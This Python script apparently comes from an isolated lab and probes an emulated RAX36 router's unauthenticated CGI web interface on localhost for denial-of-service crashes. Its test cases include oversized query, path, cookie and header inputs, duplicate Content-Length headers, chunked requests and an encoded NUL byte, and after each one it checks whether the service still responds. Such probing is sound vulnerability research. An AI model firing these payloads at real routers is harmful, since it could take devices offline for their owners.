#!/usr/bin/env python3
"""Bounded unauthenticated HTTP/CGI DoS probes for the isolated RAX36 lab."""

from __future__ import annotations

import argparse
import socket
import time


HOST = "127.0.0.1"
PORT = 25_137


def exchange(payload: bytes, port: int, timeout: float = 4.0) -> bytes:
    output = bytearray()
    with socket.create_connection((HOST, port), timeout=timeout) as client:
        client.settimeout(timeout)
        client.sendall(payload)
        client.shutdown(socket.SHUT_WR)
        try:
            while len(output) < 1024 * 1024:
                chunk = client.recv(65536)
                if not chunk:
                    break
                output.extend(chunk)
        except (TimeoutError, socket.timeout):
            pass
    return bytes(output)


def status(response: bytes) -> str:
    if not response:
        return "no-response"
    return response.splitlines()[0].decode("iso-8859-1", "replace")


def request(
    method: bytes,
    target: bytes,
    headers: list[tuple[bytes, bytes]] | None = None,
    body: bytes = b"",
) -> bytes:
    fields = [
        (b"Host", b"routerlogin.net"),
        (b"Connection", b"close"),
        *(headers or []),
    ]
    if body and not any(name.lower() == b"content-length" for name, _ in fields):
        fields.append((b"Content-Length", str(len(body)).encode()))
    return (
        method
        + b" "
        + target
        + b" HTTP/1.1\r\n"
        + b"".join(name + b": " + value + b"\r\n" for name, value in fields)
        + b"\r\n"
        + body
    )


def healthy(port: int) -> bool:
    try:
        response = exchange(request(b"GET", b"/unauth.cgi"), port)
        return response.startswith(b"HTTP/1.1 200") and b"enable_recovery" in response
    except OSError:
        return False


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument(
        "--case",
        dest="case_name",
        help="Run only one named case for repeatability checks.",
    )
    args = parser.parse_args()
    if not healthy(args.port):
        print("baseline_failed")
        return 2

    form = b"submit_flag=match_sn&serial_num=" + b"A" * 8192
    cases = [
        ("query-8192", request(b"GET", b"/unauth.cgi?" + b"A" * 8192)),
        ("query-65536", request(b"GET", b"/unauth.cgi?" + b"A" * 65536)),
        ("path-8192", request(b"GET", b"/" + b"A" * 8192)),
        ("path-65536", request(b"GET", b"/" + b"A" * 65536)),
        (
            "cookie-8192",
            request(b"GET", b"/unauth.cgi", [(b"Cookie", b"A" * 8192)]),
        ),
        (
            "cookie-65536",
            request(b"GET", b"/unauth.cgi", [(b"Cookie", b"A" * 65536)]),
        ),
        (
            "user-agent-65536",
            request(b"GET", b"/unauth.cgi", [(b"User-Agent", b"A" * 65536)]),
        ),
        (
            "host-65536",
            request(b"GET", b"/unauth.cgi", [(b"Host", b"A" * 65536)]),
        ),
        (
            "duplicate-content-length",
            request(
                b"POST",
                b"/recover.cgi",
                [
                    (b"Content-Type", b"application/x-www-form-urlencoded"),
                    (b"Content-Length", str(len(form)).encode()),
                    (b"Content-Length", b"1"),
                ],
                form,
            ),
        ),
        (
            "chunked-form",
            request(
                b"POST",
                b"/recover.cgi",
                [
                    (b"Content-Type", b"application/x-www-form-urlencoded"),
                    (b"Transfer-Encoding", b"chunked"),
                ],
                b"20\r\nsubmit_flag=match_sn&serial_num=A\r\n0\r\n\r\n",
            ),
        ),
        (
            "encoded-nul-query",
            request(b"GET", b"/unauth.cgi?x=%00" + b"A" * 8192),
        ),
    ]
    if args.case_name:
        cases = [case for case in cases if case[0] == args.case_name]
        if not cases:
            parser.error(f"unknown case: {args.case_name}")

    for name, payload in cases:
        try:
            result = status(exchange(payload, args.port))
        except OSError as error:
            result = f"socket-error:{type(error).__name__}:{error}"
        time.sleep(0.25)
        alive = healthy(args.port)
        print(f"{name} request_bytes={len(payload)} status={result} alive={alive}")
        if not alive:
            print(f"crash_candidate={name}")
            return 1
    print("result=no-observable-web-parser-dos")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
